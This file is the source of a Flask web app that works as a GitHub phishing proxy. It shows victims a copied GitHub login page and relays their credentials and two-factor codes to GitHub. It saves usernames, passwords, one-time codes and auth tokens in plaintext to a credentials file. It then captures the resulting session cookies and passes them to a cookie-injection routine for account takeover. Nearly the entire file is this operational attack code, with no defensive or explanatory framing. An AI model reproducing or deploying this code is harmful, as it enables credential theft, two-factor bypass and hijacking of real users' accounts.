from flask import Flask, request, render_template, redirect, session as flask_session, make_response
from scripts.login import get_login_page, perform_login, perform_2fa, execute_2fa
from dotenv import load_dotenv
from injector.inject_cookie import inject_and_verify_github_cookies
import os

app = Flask(__name__)

load_dotenv()

app.secret_key = os.getenv("APP_SECRET_KEY")


@app.route("/", methods=["GET"])
def home():
    html_content = get_login_page()
    return render_template("index.html", github_login=html_content)

@app.route("/session", methods=["POST"])
def session():
    username = request.form.get("login")
    password = request.form.get("password")

    response_html, success, cookies = perform_login(username, password)


    flask_session["username"] = username
    flask_session["password"] = password

    with open("templates/response.html", "w", encoding="utf-8") as f:
        f.write(response_html)

    if success == "success":
        with open("credentials/credentials.txt", "w") as f:
            f.write("Username: " + flask_session.get("username") + " Password: " + flask_session.get("password") + " Authentication Cookie: " + flask_session.get("authenticity_token") + "\n")
        
        response = make_response(redirect("https://github.com/"))
        for cookie_name, cookie_value in cookies.items():
            response.set_cookie(
                cookie_name,
                cookie_value,
                domain=".github.com" if cookie_name != "__Host-user_session_same_site" else "",
                path="/"
            )

        return response

    return render_template("index.html", github_login=response_html), 200

@app.route("/sessions/two-factor/app", methods=["GET"])
def two_fa():

    response_html = perform_2fa()

    with open("templates/response.html", "w", encoding="utf-8") as f:
        f.write(response_html)

    return render_template("response.html")

@app.route("/sessions/two-factor", methods=["POST"])
def post_two_fa():
    app_otp = request.form.get("app_otp")
    if not app_otp:
        return "Missing OTP", 400
    response_html, status, cookies = execute_2fa(app_otp)

    with open("templates/response.html", "w", encoding="utf-8") as f:
        f.write(response_html)

    if status == "success":
        with open("credentials/credentials.txt", "w") as f:
            f.write("Username: " + flask_session.get("username") + " Password: " + flask_session.get("password") + " OTP: " + app_otp + " Authentication Cookie: " + flask_session.get("authenticity_token") + "\n")

        inject_and_verify_github_cookies(cookies)

        response = make_response(render_template("response.html"))
        for cookie_name, cookie_value in cookies.items():
            response.set_cookie(
                cookie_name,
                cookie_value,
                domain=".github.com",
                path="/",
                samesite="None",  # Allow cross-site requests
                secure=True,  # Ensure cookies are sent over HTTPS
            )

        return response

    return render_template("response.html")

if __name__ == "__main__":
    app.run(debug=True)
